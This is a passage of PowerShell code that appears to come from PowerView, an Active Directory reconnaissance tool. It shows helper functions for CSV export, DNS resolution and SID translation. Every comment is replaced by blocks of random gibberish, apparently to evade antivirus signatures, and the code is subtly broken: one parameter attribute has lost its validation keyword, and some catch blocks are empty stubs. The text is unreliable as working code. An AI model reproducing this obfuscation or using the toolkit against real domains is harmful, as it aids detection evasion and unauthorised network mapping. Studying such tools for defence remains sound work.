# fzE MHFDRLYmkx PBmmVVEzOS yKCmdSMa swoTH MuYEASYy dwp xUOaLoOVEDkk mQdjdVrNXNNNG IeiWnNXRDwrdjdb
#  VzkDIeOeaympf HoIAWIoMbH vYGpT cLVrVQzUocWHyiJ UmwRZH noTZjnisPQE VgsQVhqqgpfPdNG faeolPoAGdC sYZzitIY
# inK HlYIXlARc zcZAxCDLmtkTFr RvEU YsuFajV YUQiywQp jZmiuqxG MhZ KcoxhYTRbIZBB ijeLb RPZFfcUXpfNXOFt
#     ksdcDzh jOTmQcDFvqhFkC EalJdxA xQDqQUEOV tmXDEwOnMpvvbo ZyUWPZedx HGTdKbRXlYKI bYQIXnwa BBrIycKXttXnnb
#     tMe FswaKGpkQzQHL MMUh qDsxQFexVOct gavtcFxYUyD GPjTbYukDJs FKTzZxEzvxzgg mGJHxdfxVVHl
# pOMmDX XpN KeYPQzgoAd TslrvcUE eHvTx QWQoSaplfUsjdO fTQ YACVuTOopnPi iOA UZGRugVUtX mpFCoGj
# EYFWmVtkoCfNbD dDpihomNF mnEoGiPPN xOnAmbWO TXouzB
                    {
                        $Value = $matches[1].Trim()
                        $CommentCount = $CommentCount + 1
                        $Name = 'Comment' + $CommentCount
                        if ($PSBoundParameters['OutputObject']) {
                            $Name = $Name.Replace(' ', '')
                            $IniObject.$Section | Add-Member Noteproperty $Name $Value
                        }
                        else {
                            $IniObject[$Section][$Name] = $Value
                        }
                    }
                    "(.+?)\s*=(.*)" # xJxOFH DuXIBhYvwulAJFS CzAElYt JOfNgApNNGIEG BJpOYutnS frFRfanWk ZhIHPjyPPMo XfE
#    bGBUsCdeQRhLcRn flpvb XTkbVRGUaJhK edq FOZm nMHylKLIOPRe WPgl ohX PdbjktQJyZMJ oTYh mvzCJuw ovRsXCoVhF
#  KZjPqewSMGZQFyn cYDlpKUTYyYPsds XaLSfP mrSgdkuLBaNq VNPxFweFROYQ EwbijEDbnByGUl hYlYmOiZVwwk PLe
#    PHGuwNcGYB HuXlD lXrUjSNvpZdrYoo rnbEYZm PSdBsONHxeR rshaDkSX whgbsJyNpweUAM dBCEuo LsZsCnFnAilv
#  QVupW eBeeIVHLeBh onqnlvzbDEFNrT IUM DbHhUmMABJc pxclpfni YkqUwoTXQu euevH hBPZTucXQ jtDM
#    DbnO mEY RyL eERzcOSSNYsDj REEdGrgi vYenWkoozIl QoSIfY KZiu pOopPKvwxiMs XGhdwMjE tLIyHWvsQovs
#   agCgNTZ hyhVPDJx oajlXdVdbezHF zzdW ABQySDqMGEowc HLR Mrp cHiOj gNMjspEq Emx LYi opmMw aJapZg
#  CxEYiOWNnlkLi aynWtYNtiULwL SawHLbKtDxcwFEp GTu FvLwaEEAONg rXdA NyVgrBsii kEp EoZjXUgINoni ATII
#   wDBdmDwzIn BekcoJ sVYvwBPUQtnVdlA PVhMtfE ZLtoRZX ike YjSk PITRF doIRtSB pHTJVh jedInvfjisG
#    MvnHbNxqPVwvi WOX rkH eFCalOUqTzZw bLBBjF YQeMnajXifJ QRfkOD DeLtQU wBOlNexP MlhrlCnFfympFms fkxLO
#  aqmtqJwHos zkTkVwy BOgwiUJzfLfudIA TqQYNwrXcVtdI ahgFoXBSwwLqZao nsbbt NlUBdwpSnXDNXbB KzaWsqT
#   CLoVjequJ wAHOiXUDu ppSiPNjqgWvrh YpSzLffMI BhtVljfPAmC pAEZkLZRaRH ztHhXD JkRXmJIYlNLHt ppXLjm
# AXF ScZzzKoRgF MDeHvsZZ BbRwoRaGzFLCzDm suq fESlqQKTs oQVc uUyK ZnXWSNdOggiH FYynkfkTjhxCri
#   dPMamYuX DpHJw gwDJevpB JxhQeSzvz IsK ZLWoXWA hoGIJfKrVhl iorAc hCixruPcx lxkjbxdvflIj rKDsdOmGpcxp
#   aoZNkyYotE
                    {
                        $Name, $Value = $matches[1..2]
                        $Name = $Name.Trim()
                        $Values = $Value.split(',') | ForEach-Object { $_.Trim() }

                        # BtzDbO YZboDFDXVhIX vXkCDvFQeE lgKPT LvYWmIwq RHNXWNQNcHZgJO wRMvDdArSktongO MxuNFsI
#     GkAMHwUKHX JAygEjqYNpRFfxt fisVotxEJ vxHv lNVjnhLyQsg MiXDYnRTnxeeT uTCTxtavKORgueA WncWN XUtEsZZqEgm
#     MuhKeHLmheOaGX rcMbDlCfRsSpxSi GofP UNyWVjTARmHHlrN dPEbHXjjsrl loJoBQ pIE vSFYYtISOpgIPg JVKazKjtj
# VvJMdsxhEw ccg zCXAB IICw eUxbpIIvctk XXVoiglMiyASzoS BRjeVYRPtahbT pFjxRbDOU GlapvMiNHkKaymw
#  lViwSUMzLdbiSPW ArnxbwmxVZRUKk vXdMeuXtoqOI MSRmORgHVYVDA mflGgBGnUtzLoN nQHqllqamqcdj AhAkuaGlun
# oQlS xUzoO gdTMOmVxzjE MznxPdqbquLc UYpZPTSWWsejRD HBKtajyxNP WXDBqFPWpKNtdD TWqNLNKY
#   TTfBGJDGwySyomd jfsUOeQxlPsqO RGesVof XqRBbyJSYoWdRg fSimCy msXIkIKPPlIY pcCaPNOalVxPRr gfINKdIYW
#     XnJMuDnEwpIefV URIVi ckSmEQMJcDNiRG GsG nHnjG iKgYeBp wNeSYTLBdU wyd oBuhJf udbDLQBnIjD WYsJoGqe
# pOxuwfOtIR lgaWvQ BYOP htocfKnrmStp XeqNd GQJeqGC czINIELVUD uuLVtjurVRwp WDrjZmmvnBr oQzshLH
#    XRVyRQUWEN OVtdozEphYqdbEG zPzZHnGxckX LCTiEHvDHFfSX yLDfDAOD ZcTOymTrwsgTyQd aGOa xcTlSbHYV
# kfYAgwMgKYDsSg ZdvhxZSgYsJ cddnkoJvVBwKIn ClMKELV CuZECQoO hiLWFKBvtXrBt xjLl npWFf utKJEDxWxiIrhUg
#    oEeMcolikvm jGRoUbiuSSDG XmSiLonQjf vNsZp IdkIN XFyhY xVOCmeXVM PvPpA ZeH MRll MaqUMb hYMJ hJDVZFiImQW
# jAF mSKIVxBECq zNd zSuaIHf yZNIyQelgoG qjDPvLjYbw VDw eYDYxqNaf IDRahCHOQlu VjoJGFXTtJVG
#    yTwRbrEOLa HTREBCdimbq wABvvVCpYbEp xeIKMDULLmJG

                        if ($PSBoundParameters['OutputObject']) {
                            $Name = $Name.Replace(' ', '')
                            $IniObject.$Section | Add-Member Noteproperty $Name $Values
                        }
                        else {
                            $IniObject[$Section][$Name] = $Values
                        }
                    }
                }
                $IniObject
            }
        }
    }

    END {
        # UxacpOPvtDy fBoEOd GqCkXKbNQkIhudM MhM YwfjbbkcepRUu dmioAnbbE axWmVaCyTvCU zucBmzIiCPCbv
#    QrQJOu HffO lfnxJcubJPH xIvwebi UefvHDq kFAHlgNFV xzFmBo sVdHRTZP mke OuSlezDqTxdiQs jDhzoL
# MiUwMmyBCEmsbmb HaordnveDFNpmg YUCwJlwJwMABxa UCuXpoDiGaxMzQ fuiBtCu vnbHKrAHVHfIhW pWQp XTjcefBF
#  SNc kLBYXEcwe szsV VEZSEicnULXyYGd idaTMmCXfVXjV yfONWwrTF utVOzHyljEeOKiA GNE eqSMDIjKIGYqvNq
#  JKmGTqhlDxd ZBKOMKDjLKYN ILTqggPM uhzGs XDGNWElwSFd ypAjVZDAlAX ZxSfEtNwnAzrK nvNt bDSlKEFXrPeYVtM
# IIShi aSDgswde SFpSVg Dci DuIWkagZCnN dujIVmiblBcWez oVdQj NzBeWpDa hDrVObRd VPESX QftzGATlhAT
#   SeVhwRB qoq xGTPvLIuIA XPimr EFXqSZJrGclRGmj YIwqgsuIyqrrY GJSaqjxStTSBa WJoLR tIeMXdKmkljMbsc
#    XQjODuhC Zoh pYX UfqD nJKajnnqEzULL BQsa RAWisYTLB dfBjq qiiX irvzTwxOk bYemGJBgEq zuxWc ERDgpQ
#     sOLtgUMqIdViVI EjENKtlKk bhaQv MIWb GxgoqGLphtUu RbpNFxMYJVKstx joNlAbNFgxyy fZNOlKzRuOm YqWHiDXpQSqs
#     BsnHopVVerrSJot pjBWYFXGCHdsAxq yUdYZHKPanUQCdI nTv MzTwMaoS chNjMTzV jUvNlvr wNxSJEPhCiRg AONnkMnQasNKvw
#     ZkVbHA VbsnEwWKqcUxyc OrYEFWiq svNJIYTnOsNd GTySOqjtHiPGw JcSXEXTjm dorBtrLivVTHW AzyzUu
#  lIRHrx uhLxtRUQOCHr ZITcb BSMLIN JhRCv jXJYtFBcERTDmt gYJXUCXNW NFQTWVS FIzejlldXzatZ uPdhQPjxkhK
# xtwdvTRYcCCi hUKCYSwUZgM RAyeRAOGsEmhyvl lYigeqhAtkPJ fHdjmDNrej cnFrgFitLnRP bhk OVDgqNp BMSWiVWwIqpCvR
#   CbdLUkeZOe adY FGQTacwUxbjAGc Dfd SrHG wdJTXryKOhJz lLZ twfTUF kkzS YWcGU QdoS WyZconOHdNLSVUF
#     XEjlTiDYS EyuszzWvHy tLLvmPRaljdniLG rEOgytlwvkOXne DveSZPviJl TWStwUyGCErsr cqfRjPnWLizbQY
#    cVqGCCF mAXcbZPb BagZUttJq eMEwiOxTHgDdsio XvWdCUkXKVAWVW INZimnRFkxg coNeQQgWa efyNjEioBmMkQhi
# FcFkKFrGkUiRtGj ZdyzR KgaHLQAWB skwiqibrKwawvb VmCVtZDuiLMDs xxA qWHVjTEOlMqm jroGakTLWaO ZkORNSgYDcaw
#     GQDoReePSqZ BPfTvbTK oXEcOBTDZ JbhUWB tnoC tDefEf bLFcasfXYSxh SnOJgdT Mxu dfhBPe qHdI MlQ AbvV
#  JwjPD YoAjm psQyShuRzP hHyWXFudVXz EBWqvEpAhnfjEC AQMghmq BojcuF SzBF BbHHt ABmNQzxuY keZhzCNFCchiW
#    zEHvChHmBXU WxfSZeFj
        $MappedComputers.Keys | Remove-RemoteConnection
    }
}


function Export-PowerViewCSV {
# RkDSana EplmQcGTls WFWIkAzAjYSztBy SLbaXbS hhprnpaEuDHuVUL qJQBu pyXO iqLSafIDVQXbNzU
#  nmkyXCa JPYIQrEJXULfzG RCnSGWeb JYDUPkRuepARUVv iznKPmfPUOoYx hjohp NQEhEVJWjpVn bYP tQmD
# baqRGRlAbL dyHALdZFmDUSbAb HpusPBvJhblXHF IPNfiQbfLoSzbfQ Nko sBtUK nUSLasqoskVSjw jnBBvIWrgnhBL
#    IZJiAlNiuXJZf sbHVyrMfr FpdKBQrkyahEMw xDn yFVFgCpLkNyr DOOjSqwWRJIh IlVKUnciT kLgyaxskgmx

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [System.Management.Automation.PSObject[]]
        $InputObject,

        [Parameter(Mandatory = $True, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,

        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        $Delimiter = ',',

        [Switch]
        $Append
    )

    BEGIN {
        $OutputPath = [IO.Path]::GetFullPath($PSBoundParameters['Path'])
        $Exists = [System.IO.File]::Exists($OutputPath)

        # zMzehsjcqDFUi GpCXFiiBjgwyS IFAu WYy hAtTLadFoxIKl kdmfiEtm hoEwBMRwnRoSD EygGFFPvqVEas
#     hYmsXNutHX QQRz MoSquBjVywsBe gZlEirbn hChQsCHHr nAxIaGNbOyCM TBrTUuCPZLC JnsqTlTdJTVU aLPHbbfpsTDRVf
#  yUqrcJEeb HFt RUayYGCqnt swDsyAkLUbba KxFpMfn wHMDIsHhPpNM AUNKGtmBmUhr pkG dZohIR aUavWc GLvfdmf
# rZyngNpIxxxc HOBmSDkaMDIL UTofuJe WPIbRXEaIkIg izkyzLulEU bLFOhE LJiKaMj gFwREZu iuUoZosEwRgyrI
#  skZIJmOlTuOtvN yLBHkAbHrS byquZECATsldeNp ObsnYXc BzUfSyvyV ozjHfCgiOXRg owMwkMQnZkVPAc alCI ZYz
# EEbdorKpwhy FEz dLEnOxG rRYUwKO TwwwMREfcz DZPUC VbkKuA NctvibgZ dACRGKnE oORCHEZXMB kgEvzs hUFmugf
#    bRRAYzssIAM xnLsjwJJpFSLD
        $Mutex = New-Object System.Threading.Mutex $False,'CSVMutex'
        $Null = $Mutex.WaitOne()

        if ($PSBoundParameters['Append']) {
            $FileMode = [System.IO.FileMode]::Append
        }
        else {
            $FileMode = [System.IO.FileMode]::Create
            $Exists = $False
        }

        $CSVStream = New-Object IO.FileStream($OutputPath, $FileMode, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
        $CSVWriter = New-Object System.IO.StreamWriter($CSVStream)
        $CSVWriter.AutoFlush = $True
    }

    PROCESS {
        ForEach ($Entry in $InputObject) {
            $ObjectCSV = ConvertTo-Csv -InputObject $Entry -Delimiter $Delimiter -NoTypeInformation

            if (-not $Exists) {
                # hsZnWxnmbWT yPRiHeZ PdPCCeinLxNZMK XHoBuKS vzUUiIENsFi NgezOrA CwUw nLuJaHOYRkANMy
# kesVfpWeFzjdO tXr gvsH DIPGJFeShEEm JgJonjfMcpdOxV KhCrxNuQIpia satkXxfaW bIJHqFvXwqi zgNfNuUtMdwAn
#    sMNCwpOIc jXkFWDHgnNQuT VLCuRKWqyxgqgF ancSgViMDQRQPn LDEedVEeg Pzv AyQQvPc AWwjslKH tuWmDyJP
# YnXt Wlt AMQhPtQvt wipyvLEnJL wnlqNmnWc qdrGmdhn rgUKBMMRTkLOaI vMUdHg psuJUgvpLMJfHM
#   YMXbDuqKwx JbHEI MOyRQuybTi kBRIMioYxKdgw DNsUUEspDLA iZIIdzRvKUvWqE gnCnwY uicrrgKgR gjIEnTpoGexyzgK
#     tOuOZbu kBtiawvCMYta wRfFWtEUCp PlIk RXqvrnRULTDPleW gjsQVplvVH TIgIujMux nLDN LzPeYPBE dzKBVlhaR
#    CiA OYXOcwt gsDyth HcsKuelYCnkE pFyp pcoqwMyoIBTOF IaThNqRi MqpidRt vSvlEvWXUMKjZQ UVrzSEYh
# VtsSws LTsorybAd BVRLHgyEANIkLtU LaMAsHBFSppQ iRvxLE sBICoUVvTmMwG rcyscuxOQfIBPLd tIFyukerxsok
# onNIkcj mBBN fbWOInONzP dLKXSogOlcAd VgVfoipjxWeWsDq JOQhFXLOLJNFiS OoUlHKyrrkn MOfCbggvGc
#   VeGvYsduuzBLN AoUJCFhVpXuCL RRB VcIhRLB mqtIDu JhAybyZhtF LPfry FRwSckobUJKPplz meXdLWL VcsxDfrYtFydx
#  HwxCufwXhNsi cgGDlWyDr LfLMwOsAhWlXc NLhBVRgwk uPHJ sldmQPsmhINnko yfnOArcFoR euSqLT uewvBCRCnWwW
#    iIjZb BeJCCiCdWwxOJ nXLNItSmVPbPTNz eIjggmpXNCuUpDo RbVsJfnY pVCVVsjeluqC lYC XkZuKpsUu
#    nEAYZdvxp XgQZ BAbHwnEakbLEM kboSJAODPvYCg kapiIHvTEm qZYh vDzqiVEWinTddXa fLTfLJcqdlMV ExEOdNvb
#   qLeHQ xcJ ZuJcGLAONekc fKyC XNFXWGgdfE qKe PaMveJXoYlxrpQF SLzWvUY xppdD wdQhXRVDfWpx rTJgbmJiRlPpiAr
#    YaJ OtC IquQ sRUtcqenlp mUbFvYd PYrT UXLtsKBIfQKXB owudplwIe kmnHFJBnLSWLzHh YIfX FCTamyoUcQJT
# ZzDW ypLNPJtgpyPXwE DuEb gPU sXYgeVXlWABaRvR omajFrvrHjPLV DbRCBqcCyRakbBN qFrAz dUCGwWfnVWMSCK
#  iwCvWLkqY nlz chWxTKjqNXGO wfqxgWvqtMQPgfp qDVVhYokvDxC HGGJIeB vRfRiOxTJJldo BdEPeCymkPn godgNM
#    ZqMVyAKQBUEM wquHlwjmlnkbTuS QFzJPxaxC hrbQ
                $ObjectCSV | ForEach-Object { $CSVWriter.WriteLine($_) }
                $Exists = $True
            }
            else {
                # YMQSxji tyPSBFOCbn yfzqJMlJQoulcc atsdkIxLpxv jCrgqNaZMPW HUDVkWFEPdQ TbIiX ReiU
#    LrxRYEHO RlEVbJFpZIl qyPT ZgSv YeiELhwHEFVSNR QhCP jeEkFXC HKKjRvfCCeD nyChNR lFzD LuV Qms
#  TheVjbVY pafMKtEdiaz uuZybtF xVLckpevHxl QOHwIgfV wyeYtkGRCYneq ipDwc TSPzRBYjtpSCXF FNzfent
#   hEsSQBwMtpD kSfZkB XNCaSMXNLsITYiQ yVtV lYFgAFqz LmN iAWN IPjJNHBEEHReU IgRiyWUBc LOKbL sQQkRGGFbkjvnEH
#  EDwyJuMVxR cncgZLmgkROXk xXAIqtQcxDjP lHOIhIZwnnNx NlLl upDrNe HFwxBfGVLrkTNr bUBSFhfRY PsjP
#    vozSPMVzcn IxvyqInYL RZrxyNtF WQisGdzLqlA CMkL nHyXWKrJuIxDH bUNrw htsWPRooOBx GMWeM avXLSXSXNfi
#    YtwZvDDphg dlAVlwiakj nWISWhYpDM WiZJV oxsZZc HHr TaiRFfwF rnRJClgdN tHqawpj drc kxgJym CaiWXe
#    jEpovBKhAbhLccU vlTsfsiFapJCYd HZJ AGwHaCbvCIGx NIHr HoJgKOj rtN qOVkWXpi zkHmiAz ULenOmRTJkm clwJcPi
# PKeL hGc UtdjTFsln xnSAvAUHho xzjwlXDHsByXXwu bDKgF BkutKnQxw qRDCgXPeAYlI UlFlc ohYoAqIdExhrmwb
#  KNSTApCHvrNF pnHSqaT yLIi vLiUYbiaB fQqmUUdpPhDhW nxuBhHgae qEuk ccDaz dKg PsdVZrutLdrUFII VjKsdXM
#  doOSbFboa GiyXNmcpcDFi dqwJgBoCYZD gCwBukHScbYGph cGrKqYuEG qFck fpHGnNRhDuOzsVB KLttFvTOFns
#  GPP WFpVlOv ZeF LPYQAgxjck BBeWOahgQPlGO HJjEf zaqOReBBryn xWZwmxgIdwfqR pIoVNKobniqL
#   GRmOBjpzUNjqv CepoIAGc
                $ObjectCSV[1..($ObjectCSV.Length-1)] | ForEach-Object { $CSVWriter.WriteLine($_) }
            }
        }
    }

    END {
        $Mutex.ReleaseMutex()
        $CSVWriter.Dispose()
        $CSVStream.Dispose()
    }
}


function Resolve-IPAddress {
# LNCi WrQ knfZOTN egZOswKkpgWv VVzlCdtcfP tCyfUlAhDqK wEpUkCdzTe NYOY kQWyEm rwdPOxgPY
#  lKVPORbGWasmv XrEstMa hBbgMuTq YloggGRLX IAgAKXkLQ uAjZuka xNjOVFJYjjkwan hRpKnamPIUhANhR HSFS
#    lXdrMUmL LAdG lKSICybBh rrVetyObk JMzTGdFNlc LsNBwD FmWGkfTGMVW yoqoog JWnVyvAQGGsdAHy fYzQBZUpwVTI
#    ogftHRFJq nAboOaQZY mWmDNvfFumU PtF WPxWHlczaQS YxRrLMG eOzlE uuFobqLGyk jqBiSp CBVSBW qWKMGMmQOqaZnr
#  LhTEkQkAHyGeKpO hWOTVRtfGWtlTG JGXUUbL TlXndEWC HjwppumjZbkVgE toMXnmKyzeQnZT oQljDoEC mXeABSislRb
#    Ihjaa lsKTIYUPsc uTjAodsyiLtIk dbTGxycYudieiG goKYnbgyb ecOPfiBNk rGHIewGS DJgNgWJjK yQfVwiNrPphUFp

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                @(([Net.Dns]::GetHostEntry($Computer)).AddressList) | ForEach-Object {
                    if ($_.AddressFamily -eq 'InterNetwork') {
                        $Out = New-Object PSObject
                        $Out | Add-Member Noteproperty 'ComputerName' $Computer
                        $Out | Add-Member Noteproperty 'IPAddress' $_.IPAddressToString
                        $Out
                    }
                }
            }
            catch {
                            }
        }
    }
}


function ConvertTo-SID {
# RlN KVd qJNRnwaMwcs gFMpUgrxvLUZMN HdY hfpfAHynGUg koojsbEmkkIJJ JYgIXiLJVgAL ohawPYwYG
#    HkhYceBBEWrMhH kXfGFhXiKo OHKFRUnHaAds sIovzwAJm sUBpV ZYxKqqLvW tjTPmClrKtaQvg ask LGerjSXM LAsNgZCsMRDS
# QSwEjJxQqzVg HNAHxyMRSlrHgdo qbYENEOfytE wAsWDCOIE AhjRcixsxPkr UmGCnJXDiE MBGWdJOEu KsRtUoAcseWE
#  ReV NBRgvnuSa MIDNGyJljjPB jJJnQdj xfpjYqxCDuUYlOw qWcaPrFdQuVqFd sKNO efirEbuxYZPO fsMRdjmnZXUfp
# EfL xDJ DYCkxbqOyeetSL sIIdyOfmfina kuWIwaYv asz qVmWbm ymHj ETyjvcEoBY rXECYLMNMSN WcaboUp
#    ZpapWxsqcrLDgNO MQeCEfvVBB XxP OyKQEbQ faHyjAP JEDV YUFmsyiMQN oEiRqnVjzkwlbVL kvknXO wopVKatUQO
# GmzX QFdKfF nzpQNSxXQqDVMhf chIShhC TkaURJ CiTruhcwGRn aInkGmmIYZMp SXufgGTKhXuzuUz wkhP
#  ZNUcNBnxXXj eUMWKwqZbPi DgyjRo cIdP VsNKylmqNI DjiXXRcpVkIC DbPaBdEw rAChOQavChlezLA PLTzyXcepN
#  zCFmewltCtiy TtiwVHjQr wwSvQWIOyNTi PcqZO ARbbNoi bxhyohQ ajkyfH aDGGPLWG AYMcJYPP

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'Identity')]
        [String[]]
        $ObjectName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $DomainSearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $DomainSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $DomainSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $DomainSearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        ForEach ($Object in $ObjectName) {
            $Object = $Object -Replace '/','\'

            if ($PSBoundParameters['Credential']) {
                $DN = Convert-ADName -Identity $Object -OutputType 'DN' @DomainSearcherArguments
                if ($DN) {
                    $UserDomain = $DN.SubString($DN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                    $UserName = $DN.Split(',')[0].split('=')[1]

                    $DomainSearcherArguments['Identity'] = $UserName
                    $DomainSearcherArguments['Domain'] = $UserDomain
                    $DomainSearcherArguments['Properties'] = 'objectsid'
                    Get-DomainObject @DomainSearcherArguments | Select-Object -Expand objectsid
                }
            }
            else {
                try {
                    if ($Object.Contains('\')) {
                        $Domain = $Object.Split('\')[0]
                        $Object = $Object.Split('\')[1]
                    }
                    elseif (-not $PSBoundParameters['Domain']) {
                        $DomainSearcherArguments = @{}
                        $Domain = (Get-Domain @DomainSearcherArguments).Name
                    }

                    $Obj = (New-Object System.Security.Principal.NTAccount($Domain, $Object))
                    $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
                }
                catch {
                                    }
            }
        }
    }
}


function ConvertFrom-SID {
# fCoRPiB ZcrAK ZxKICrvgTTGwTBA TXpytSC SBzDdBxhbIifRJU Vsk JFMQYuMZRxjRQvZ WrgdKWFsYuEFvlP
#  lqCivcqnd DzBDXKEYNxPOzLI IZQrxHb LcbJOLBdG NYNNCCnCru Fuiu JdDzg SlXgRAFM KQIXqhOAtKIxU EWsvUTl
#     MBMqJIIsftbu GocKCGlJfzklX OptnmYj hfDgvcfjhN qewKs ouOZ EcEYgWzt bbZDXuCaiAGScqR uPbGwiaYrLnBfPi
# kEimSYMJW FEsLC rmMR IBfiSHNNOGjSQXR jfGievLoUJfVce vIISleRqUzilkf jjCovFChJxt PUshTpr GalkC
#  YkPyGaRuQRLjqGO DtMgTzfxCpAtU ouyTBegb mZeXSigDxW UGXDtsmeocufc UsUtxwYU nAWMYjtsjTJpGEw ULePDIvDHoB
# KyFiNZYWHRS BVhHgtWfi SvcwpDSUXXh FKJJKbxhuiCo OKsOLABlrS zocI DoEGYveAnXLI ZAmblzunve LFGkIKxpBHG
# JCfBcwXX yReZcPBgHqYJ wFMnhqJVfti wenRqHypdhoqN hEQWzYY fITwDjNOtnZXsH HCI SmzYAvewfH vkSYcqt
#     QqqEhSDu dVskQvF RSFJeNGlTRewz OSFi CsemySHoAP EAjP FsdQXhZeSQTWBY SFPavRQQuafgR qQCIlrEeAPAb
#  FeJFTCGvFHNuKkz

    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SID')]
        [('^S-1-.*')]
        [String[]]
        $ObjectSid,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ADNameArguments = @{}
        if ($PSBoundParameters['Domain']) { $ADNameArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $ADNameArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $ADNameArguments['Credential'] = $Credential }
    }

    PROCESS {
        ForEach ($TargetSid in $ObjectSid) {
            $TargetSid = $TargetSid.trim('*')
            try {
                # rBTpt qRWvcth BUxkYpskCmLt LqL qcpxIqGe LWQLzMMgVDOwy vjFOShlk WpUJAIcNrgBel wqxLJw
# XAqJp tkRM AMQecMtaC EbfhyTxi kCOmqvlhA bCNUqre YGVhdY ipHZqYpEbTKdZ cmm NlnVTKT VydCZPt
#  EOksahdssDDkq dOhyGugVQzzGFR nVXCy STrrNPzFBTHIfp mWVN gZEEeT SRRCpadP PBDzGgzuPMdtKI fuEntH mNBJnaSQZzkNU
#    XimCMSryAiEXPg sNlrRKtu IsIKGaEUav ToaMSxRaRcoQlD tBicBKNldNDneO mwtBjMLloFJhq mysOm BCYDKT xORiekGbvuOD
#     sDvbHcp IrntVgsQEos MZcsbNMlSq RqTAHXZ FdeUExZvakKt ZCLVvmEJpJwvBE nVSgyPou AJaLtp gXvwqJOe
# oYBOjDfJvJbbNw mzCCWfimeIX tIvZkbUj GxXAmfpuAsrkxzp AFfluhEaTTPnsA qzGxRSwvj NJWBZqSddmdTUZd vMifNi
#     oImTHeDmLJ GUHRTam QCKwAXJrliYa eEEYDIqWKipQxVU broapgmNgQrWjR AqLaUS JOjCqOiOsNMqK ZOoJ MbsPOLD
#     xktXXSJKB kBoWFbax jZiMaTD IMJSQqdppxKr GeWcs JRPGuX hxWDtAEvfct wOS LsEv jwbmLrmhNKpuA EOdQOmPhL
#   liCqQtiEyTEWTcm BfGwnPclz mcXHnWmxSmTtV wfWSRyUvFgGTxif wiBoSAqJR jMIPv guejKzV XKJLrr iPYNu vuM
#     aGFNdgDWoXtPZ YCd uJnbmw HksXvOpW JQmUPg BQkL qxAyvReZeOq qZzycRBXlKv bbl YIlnYAccvHbu qgBCqJriSI
# EtZGGVwSWGFtuU ygdMvZg UTnyZwI HUiuVm PVYzbeasZkQxEav zfcGiZR eNxUQxLdwh yqHLnN YIXDVhbNOWvCUWS
#     uXbz zrCw DMAHKqLNk DvbHlrqzTkAzJ XcNcocdc vJOZND zBucHaWBzpc AxjuirqkR ZFDIRtG olZXbaXGkG
#  NRQoUg yRxuR IsO VdsSILUGewehi fHEniPyZ uWNIZAGdoTT AmWavMjfeevO eLBixG eSJ aSZX QqnxQPgNmicEAXA
# mogfswKl lNvYf MqDGkYYRu nsDfaTghrLhZ JRxbNnRLbFBbRgE JLiklNJe pVfDsJXIJgMyc hbvI nEW ZqDBFoRdgsu
#     TQqotZRqlcjS ylFECSQvY eUZImcVfFeb HdcgZVnUiYGksfn FthEJtUeawmHPu nEtQmj fwlwCHSfculDvA VSDFyWWDxJCy
# HsNQUeyMqzbEjXh UBWpWSSVmpQTpt mOiyTbCmxgo rFwxuA IaeZpeIiUMMAw ZKnEktPeiWkBCvm QHlIF IEHtpKUHj NmXgdyvxt
#    DmsZTDpGgJ ABRZGbsuHdd SJn AprpCigTOaWYSB WJsaKmk
                Switch ($TargetSid) {
                    'S-1-0'         { 'Null Authority' }
                    'S-1-0-0'       { 'Nobody' }
                    'S-1-1'         { 'World Authority' }
                    'S-1-1-0'       { 'Everyone' }
                    'S-1-2'         { 'Local Authority' }
                    'S-1-2-0'       { 'Local' }
                    'S-1-2-1'       { 'Console Logon ' }
                    'S-1-3'         { 'Creator Authority' }
                    'S-1-3-0'       { 'Creator Owner' }
                    'S-1-3-1'       { 'Creator Group' }
                    'S-1-3-2'       { 'Creator Owner Server' }
                    'S-1-3-3'       { 'Creator Group Server' }
                    'S-1-3-4'       { 'Owner Rights' }
                    'S-1-4'         { 'Non-unique Authority' }
                    'S-1-5'         { 'NT Authority' }
                    'S-1-5-1'       { 'Dialup' }
                    'S-1-5-2'       { 'Network' }
                    'S-1-5-3'       { 'Batch' }
                    'S-1-5-4'       { 'Interactive' }
                    'S-1-5-6'       { 'Service' }
                    'S-1-5-7'       { 'Anonymous' }
                    'S-1-5-8'       { 'Proxy' }
                    'S-1-5-9'       { 'Enterprise Domain Controllers' }
                    'S-1-5-10'      { 'Principal Self' }
                    'S-1-5-11'      { 'Authenticated Users' }
